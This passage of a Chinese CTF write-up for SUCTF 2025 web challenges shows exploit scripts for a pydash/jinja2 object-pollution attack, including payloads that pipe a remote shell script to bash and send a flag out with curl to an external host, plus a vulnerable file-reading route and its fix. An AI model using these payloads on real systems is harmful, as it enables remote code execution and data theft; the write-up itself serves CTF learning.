</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>call_customizer</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>default_type</span> <span class=o>=</span> <span class=nb>dict</span> <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span> <span class=nb>dict</span><span class=p>)</span> <span class=k>else</span> <span class=nb>list</span>
</span></span><span class=line><span class=cl>    <span class=n>tokens</span> <span class=o>=</span> <span class=n>to_path_tokens</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>pyd</span><span class=o>.</span><span class=n>is_list</span><span class=p>(</span><span class=n>tokens</span><span class=p>):</span>  <span class=c1># pragma: no cover</span>
</span></span><span class=line><span class=cl>        <span class=n>tokens</span> <span class=o>=</span> <span class=p>[</span><span class=n>tokens</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>last_key</span> <span class=o>=</span> <span class=n>pyd</span><span class=o>.</span><span class=n>last</span><span class=p>(</span><span class=n>tokens</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>last_key</span><span class=p>,</span> <span class=n>PathToken</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>last_key</span> <span class=o>=</span> <span class=n>last_key</span><span class=o>.</span><span class=n>key</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>target</span> <span class=o>=</span> <span class=n>obj</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>idx</span><span class=p>,</span> <span class=n>token</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>pyd</span><span class=o>.</span><span class=n>initial</span><span class=p>(</span><span class=n>tokens</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>token</span><span class=p>,</span> <span class=n>PathToken</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>key</span> <span class=o>=</span> <span class=n>token</span><span class=o>.</span><span class=n>key</span>
</span></span><span class=line><span class=cl>            <span class=n>default_factory</span> <span class=o>=</span> <span class=n>pyd</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>tokens</span><span class=p>,</span> <span class=p>[</span><span class=n>idx</span> <span class=o>+</span> <span class=mi>1</span><span class=p>,</span> <span class=s2>&#34;default_factory&#34;</span><span class=p>],</span> <span class=n>default</span><span class=o>=</span><span class=n>default_type</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>key</span> <span class=o>=</span> <span class=n>token</span>
</span></span><span class=line><span class=cl>            <span class=n>default_factory</span> <span class=o>=</span> <span class=n>default_type</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>obj_val</span> <span class=o>=</span> <span class=n>base_get</span><span class=p>(</span><span class=n>target</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>path_obj</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>call_customizer</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>path_obj</span> <span class=o>=</span> <span class=n>call_customizer</span><span class=p>(</span><span class=n>obj_val</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>path_obj</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>path_obj</span> <span class=o>=</span> <span class=n>default_factory</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>base_set</span><span class=p>(</span><span class=n>target</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=n>path_obj</span><span class=p>,</span> <span class=n>allow_override</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>target</span> <span class=o>=</span> <span class=n>base_get</span><span class=p>(</span><span class=n>target</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>TypeError</span> <span class=k>as</span> <span class=n>exc</span><span class=p>:</span>  <span class=c1># pragma: no cover</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>target</span> <span class=o>=</span> <span class=n>target</span><span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>key</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>                <span class=n>_failed</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>Exception</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>_failed</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>_failed</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>TypeError</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Unable to update object at index </span><span class=si>{</span><span class=n>key</span><span class=si>!r}</span><span class=s2>. </span><span class=si>{</span><span class=n>exc</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>value</span> <span class=o>=</span> <span class=n>base_get</span><span class=p>(</span><span class=n>target</span><span class=p>,</span> <span class=n>last_key</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>base_set</span><span class=p>(</span><span class=n>target</span><span class=p>,</span> <span class=n>last_key</span><span class=p>,</span> <span class=n>callit</span><span class=p>(</span><span class=n>updater</span><span class=p>,</span> <span class=n>value</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>obj</span>
</span></span></code></pre></td></tr></table></div></div><p>然后进行fuzz即可，发现过滤了<code>__loader__</code>，直接用<code>__spec__</code>进行替换即可，写个脚本进行发包即可，不过后面的<code>value</code>参数一样有问题，仍然需要绕过，不过curl是可以使用的，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://27.25.151.48:10002/Admin?pass=SUers&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;key&#34;</span><span class=p>:</span><span class=s2>&#34;__init__.__globals__.json.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2&#34;</span><span class=p>,</span><span class=s2>&#34;value&#34;</span><span class=p>:</span><span class=s2>&#34;*;import os;os.system(&#39;curl http://156.238.233.9/shell.sh|bash&#39;);#&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>headers</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span> <span class=s1>&#39;application/json&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>payload_json</span><span class=o>=</span><span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>payload_json</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>payload_json</span><span class=p>,</span><span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>污染成功之后，访问网站，触发，成功反弹，</p><p><img src=/p/suctf2025/image-20250113160854198.png width=1732 height=926 srcset="/p/suctf2025/image-20250113160854198_hu_76de9cb4741a0355.png 480w, /p/suctf2025/image-20250113160854198_hu_231d284b14a6303.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=187 data-flex-basis=448px></p><p>但是这里的靶机是两分钟刷新的，如果这里的靶机是五分钟的，那么推荐V&amp;N师傅infernity宝子的做法</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url1</span> <span class=o>=</span> <span class=s2>&#34;http://27.25.151.48:5000/Admin?pass=SUers&#34;</span>
</span></span><span class=line><span class=cl><span class=n>url2</span> <span class=o>=</span> <span class=s2>&#34;http://27.25.151.48:5001/Admin?pass=SUers&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cookies</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;session&#34;</span><span class=p>:</span><span class=s2>&#34;eyJ1c2VybmFtZSI6ImFkbWluIn0.Z4MUfA.gaWUfOrunhWrYl1po8bZCWjzePk&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>json</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;key&#34;</span><span class=p>:</span><span class=s2>&#34;__init__.__globals__.globals.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;value&#34;</span><span class=p>:</span><span class=s2>&#34;*;import os;os.system(&#39;/read&#39;&#39;f&#39;&#39;lag | curl -d @- bxyyymgu.requestrepo.com&#39;)&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url1</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>,</span><span class=n>json</span><span class=o>=</span><span class=n>json</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url1</span><span class=p>,</span><span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>)</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url2</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>,</span><span class=n>json</span><span class=o>=</span><span class=n>json</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url2</span><span class=p>,</span><span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>)</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=小点子>小点子</h3><p>其实我一开始出题的时候我就知道怎么绕过时间戳这里的问题，因为我的session设置只有用户名，所以如果注册admin就可以绕过，这个是正常的，搞笑的是一个代码问题，请看路由</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/article&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>article</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;username&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>session</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>file_name</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;file&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>file_name</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;article.html&#39;</span><span class=p>,</span> <span class=n>file_name</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s2>&#34;未提供文件名。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>blacklist</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;waf.py&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>any</span><span class=p>(</span><span class=n>blacklisted_file</span> <span class=ow>in</span> <span class=n>file_name</span> <span class=k>for</span> <span class=n>blacklisted_file</span> <span class=ow>in</span> <span class=n>blacklist</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;article.html&#39;</span><span class=p>,</span> <span class=n>file_name</span><span class=o>=</span><span class=n>file_name</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s2>&#34;大黑阔不许看&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>file_name</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;articles/&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;article.html&#39;</span><span class=p>,</span> <span class=n>file_name</span><span class=o>=</span><span class=n>file_name</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s2>&#34;无效的文件路径。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>file_name</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>articles</span><span class=o>.</span><span class=n>values</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>)</span> <span class=o>!=</span> <span class=s1>&#39;admin&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;article.html&#39;</span><span class=p>,</span> <span class=n>file_name</span><span class=o>=</span><span class=n>file_name</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s2>&#34;无权访问该文件。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>file_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>BASE_DIR</span><span class=p>,</span> <span class=n>file_name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>file_path</span> <span class=o>=</span> <span class=n>file_path</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;../&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>file_path</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>content</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>FileNotFoundError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>=</span> <span class=s2>&#34;文件未找到。&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>app</span><span class=o>.</span><span class=n>logger</span><span class=o>.</span><span class=n>error</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Error reading file </span><span class=si>{</span><span class=n>file_path</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>=</span> <span class=s2>&#34;读取文件时发生错误。&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;article.html&#39;</span><span class=p>,</span> <span class=n>file_name</span><span class=o>=</span><span class=n>file_name</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=n>content</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>这里我将路径替换写到了最后面，所以导致了非预期，</p><p><img src=/p/suctf2025/image-20250113161719333.png width=1772 height=626 srcset="/p/suctf2025/image-20250113161719333_hu_e6d60da0fdf38a74.png 480w, /p/suctf2025/image-20250113161719333_hu_5736eae28923e2f.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=283 data-flex-basis=679px></p><p>导致狼组读到了waf，但是无伤大雅，不会绕哈哈，那么如何修复这个漏洞呢，其实测试一下发现，只要将代码顺序修改一下就可以修复这个漏洞了</p><p><img src=/p/suctf2025/image-20250113163627295.png width=968 height=697 srcset="/p/suctf2025/image-20250113163627295_hu_6ac8ef499e0caa8e.png 480w, /p/suctf2025/image-20250113163627295_hu_f90cfa4e953d6546.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=138 data-flex-basis=333px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/article&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>article</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;username&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>session</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>file_name</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;file&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>file_name</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;article.html&#39;</span><span class=p>,</span> <span class=n>file_name</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s2>&#34;未提供文件名。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>file_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>BASE_DIR</span><span class=p>,</span> <span class=n>file_name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>file_path</span> <span class=o>=</span> <span class=n>file_path</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;../&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>blacklist</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;waf.py&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>any</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>basename</span><span class=p>(</span><span class=n>file_path</span><span class=p>)</span> <span class=o>==</span> <span class=n>blacklisted_file</span> <span class=k>for</span> <span class=n>blacklisted_file</span> <span class=ow>in</span> <span class=n>blacklist</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;article.html&#39;</span><span class=p>,</span> <span class=n>file_name</span><span class=o>=</span><span class=n>file_name</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s2>&#34;大黑阔不许看&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>file_name</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;articles/&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;article.html&#39;</span><span class=p>,</span> <span class=n>file_name</span><span class=o>=</span><span class=n>file_name</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s2>&#34;无效的文件路径。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>file_name</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>articles</span><span class=o>.</span><span class=n>values</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>)</span> <span class=o>!=</span> <span class=s1>&#39;admin&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;article.html&#39;</span><span class=p>,</span> <span class=n>file_name</span><span class=o>=</span><span class=n>file_name</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s2>&#34;无权访问该文件。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>file_path</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>content</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>FileNotFoundError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>=</span> <span class=s2>&#34;文件未找到。&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>app</span><span class=o>.</span><span class=n>logger</span><span class=o>.</span><span class=n>error</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Error reading file </span><span class=si>{</span><span class=n>file_path</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>=</span> <span class=s2>&#34;读取文件时发生错误。&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;article.html&#39;</span><span class=p>,</span> <span class=n>file_name</span><span class=o>=</span><span class=n>file_name</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=n>content</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=su_photogallery>SU_photogallery</h2><p>首先把docker传到机器上面</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
